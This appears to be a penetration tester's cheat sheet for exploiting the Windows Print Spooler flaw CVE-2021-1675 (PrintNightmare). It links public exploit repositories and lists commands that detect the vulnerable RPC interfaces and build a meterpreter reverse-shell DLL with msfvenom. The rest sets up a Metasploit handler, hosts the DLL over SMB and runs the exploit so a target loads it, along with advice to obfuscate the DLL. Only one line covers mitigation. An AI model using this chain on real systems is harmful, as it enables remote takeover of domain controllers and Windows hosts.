https://github.com/cube0x0/CVE-2021-1675
https://github.com/calebstewart/CVE-2021-1675

# check for vulnerability

```
rpcdump.py @DC_IP | egrep 'MS-RPRN|MS-PAD'
```


## Showcase 
create a rev_shell
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll > shell.dll
```

run msfconsole
```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
options
set lport PORT
set lhost ATTACKER_IP

```

hosting smb server

```
smbserver.py share `pwd` (to share the current directory ) -smb2support

```

# running payload
```
python3 CVE DOMAIN/USER:PASSWORD@IP '\\ ATTACKER_IP\SHARE\shell.dll'
```

Obfuscate the shell.dll

# Mitigation
- Disable Spooler service 